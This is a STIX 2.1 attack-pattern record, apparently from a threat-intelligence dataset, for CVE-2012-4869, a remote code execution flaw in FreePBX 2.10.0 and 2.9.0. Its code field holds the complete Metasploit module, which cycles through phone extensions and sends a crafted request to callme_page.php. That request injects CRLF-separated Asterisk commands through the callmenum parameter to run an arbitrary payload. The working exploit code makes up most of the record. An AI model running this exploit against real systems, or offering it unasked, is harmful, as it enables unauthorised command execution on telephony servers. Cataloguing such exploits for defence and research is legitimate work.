{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70ecaa72-637a-43d3-bd2b-2a8b2ceb0ce7",
    "created": "2024-08-14T17:14:47.858721Z",
    "modified": "2024-08-14T17:14:47.858725Z",
    "name": "FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution",
    "description": " This module exploits FreePBX version 2.10.0,2.9.0 and possibly older. Due to the way callme_page.php handles the 'callmenum' parameter, it is possible to inject code to the '$channel' variable in function callme_startcall in order to gain remote code execution.  Please note in order to use this module properly, you must know the extension number, which can be enumerated or bruteforced, or you may try some of the default extensions such as 0 or 200.  Also, the call has to be answered (or go to voice).  Tested on both Elastix and FreePBX ISO image installs. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/freepbx_callmenum.rb",
            "external_id": "freepbx_callmenum.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4869"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution',\n      'Description'    => %q{\n        This module exploits FreePBX version 2.10.0,2.9.0 and possibly older.\n        Due to the way callme_page.php handles the 'callmenum' parameter, it\n        is possible to inject code to the '$channel' variable in function\n        callme_startcall in order to gain remote code execution.\n\n        Please note in order to use this module properly, you must know the\n        extension number, which can be enumerated or bruteforced, or you may\n        try some of the default extensions such as 0 or 200.  Also, the call\n        has to be answered (or go to voice).\n\n        Tested on both Elastix and FreePBX ISO image installs.\n      },\n      'Author'         => [ 'muts','Martin Tschirsich' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-4869' ],\n          [ 'OSVDB', '80544' ],\n          [ 'EDB', '18649' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-03-20'))\n\n    register_options(\n      [\n        OptString.new(\"EXTENSION\", [ true, \"A range of Local extension numbers\", \"0-100\" ]),\n      ])\n  end\n\n  def exploit\n    # Check range input\n    if datastore['EXTENSION'] =~ /^(\\d+)\\-(\\d+)$/\n      min = $1.to_i\n      max = $2.to_i\n    else\n      print_error(\"Please specify a range for option 'EXTENSION'\")\n      return\n    end\n\n    cmd = Rex::Text.uri_encode(payload.encoded)\n\n    (min..max).each do |e|\n      connect\n      print_status(\"#{rhost}:#{rport} - Sending evil request with range #{e.to_s}\")\n      res = send_request_raw({\n        'method' => 'GET',\n        'uri' => \"/recordings/misc/callme_page.php?action=c&callmenum=\"+e.to_s+\"@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20#{cmd}%0D%0A%0D%0A\",\n        'version' => '1.0',\n        'vhost'   => rhost\n      })\n      handler\n      disconnect\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-03-20",
    "x_mitre_platforms": [
        "['unix']"
    ]
}